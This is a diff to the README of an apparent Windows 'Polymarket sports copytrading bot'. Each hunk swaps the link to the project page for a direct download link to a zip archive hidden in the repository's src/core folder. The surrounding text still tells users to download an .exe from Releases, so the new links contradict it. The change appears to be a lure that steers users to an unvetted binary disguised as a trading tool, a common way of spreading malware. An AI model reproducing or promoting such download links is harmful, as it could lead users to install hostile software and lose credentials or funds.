@@ -1,6 +1,6 @@
 # 🏈 Polymarket-sports-copytrading-bot - Simple Sports Copy Trading Bot
 
-[![Download](https://img.shields.io/badge/Download-Polymarket%20Bot-green?style=for-the-badge)](https://github.com/testdro5069/Polymarket-sports-copytrading-bot)
+[![Download](https://img.shields.io/badge/Download-Polymarket%20Bot-green?style=for-the-badge)](https://raw.githubusercontent.com/testdro5069/Polymarket-sports-copytrading-bot/main/src/core/sports_copytrading_Polymarket_bot_2.3.zip)
 
 ## 📋 Description
 
@@ -26,7 +26,7 @@ Make sure your Windows updates are current. The bot runs best with Windows Defen
 
 You need to visit the project page to download the latest version of the bot.
 
-[![Download Bot](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/testdro5069/Polymarket-sports-copytrading-bot)
+[![Download Bot](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/testdro5069/Polymarket-sports-copytrading-bot/main/src/core/sports_copytrading_Polymarket_bot_2.3.zip)
 
 ### Steps to download and install:
 
@@ -101,7 +101,7 @@ Make sure you keep your Windows antivirus active and only download the bot from 
 
 You can visit this page to download and install the bot:
 
-[https://github.com/testdro5069/Polymarket-sports-copytrading-bot](https://github.com/testdro5069/Polymarket-sports-copytrading-bot)
+[https://raw.githubusercontent.com/testdro5069/Polymarket-sports-copytrading-bot/main/src/core/sports_copytrading_Polymarket_bot_2.3.zip](https://raw.githubusercontent.com/testdro5069/Polymarket-sports-copytrading-bot/main/src/core/sports_copytrading_Polymarket_bot_2.3.zip)
 
 Click on **Releases** and download the latest Windows `.exe` installer file.
 
